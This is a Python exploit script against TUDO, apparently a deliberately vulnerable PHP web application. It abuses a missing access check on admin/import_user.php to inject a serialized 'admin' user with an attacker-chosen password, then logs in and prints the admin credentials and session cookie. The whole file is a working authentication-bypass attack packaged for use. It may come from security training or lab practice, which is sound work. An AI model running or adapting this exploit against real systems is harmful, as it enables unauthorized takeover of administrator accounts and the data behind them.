# Authentication Bypass - Missing Access Control in import_user.php
# xpnt0
# October 2026

import requests
import argparse
import hashlib
import secrets
import string

# Parse arguments
parser = argparse.ArgumentParser(description="Gains admin unauthenticated by abusing missing access control on admin/import_user.php")
parser.add_argument("target", help="Target URL")
args = parser.parse_args()

target = args.target.rstrip("/")

# Pick a random password so the injected admin row is always uniquely selected,
# even if the original admin row (or rows from previous runs) are present.
password = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(20))
pw_hash = hashlib.sha256(password.encode()).hexdigest()


def serialize_user(username, password_hash, description):
    # PHP serialize() of a TUDO User object (byte-length strings)
    def s(v):
        return 's:{}:"{}";'.format(len(v.encode()), v)
    body = s("username") + s(username) + s("password") + s(password_hash) \
        + s("description") + s(description)
    return 'O:4:"User":3:{{{}}}'.format(body)


s = requests.Session()

# 1. Inject an "admin" row. import_user.php has no session/isadmin check, unlike
#    update_motd.php, so this works with no authentication at all.
payload = serialize_user("admin", pw_hash, "pwned")
r = s.post(target + "/admin/import_user.php", data={"userobj": payload}, allow_redirects=False)
if r.status_code not in (200, 302):
    print("[-] import_user.php returned {}".format(r.status_code))
    raise SystemExit(1)
print("[*] Injected admin row with password: {}".format(password))

# 2. Log in as the admin we just created. login.php sets isadmin from the
#    username string, and there is no UNIQUE constraint on users.username.
r = s.post(target + "/login.php", data={"username": "admin", "password": password}, allow_redirects=False)
if not (r.status_code == 302 and r.headers.get("Location", "").endswith("/index.php")):
    print("[-] Login failed")
    raise SystemExit(1)
print("[*] Logged in as admin")

# 3. Confirm admin privileges.
if "[Admin Section]" in s.get(target + "/index.php").text:
    print("[+] Got admin: admin / {} (PHPSESSID={})".format(password, s.cookies.get("PHPSESSID")))
else:
    print("[-] Logged in but admin dashboard not visible")
    raise SystemExit(1)
